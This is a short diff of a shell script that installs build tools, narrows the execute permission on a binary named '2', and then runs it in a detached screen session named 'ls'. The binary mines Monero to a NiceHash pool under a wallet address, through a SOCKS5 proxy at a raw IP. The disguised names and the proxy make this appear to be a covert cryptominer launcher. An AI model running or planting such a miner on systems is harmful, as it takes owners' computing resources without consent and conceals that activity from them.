@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen libjansson4 -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
-chmod +x 2
+chmod u+x 2
 screen -dmS ls
  ./2  -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.1 -x socks5://184.181.217.210:4145 -p x
  
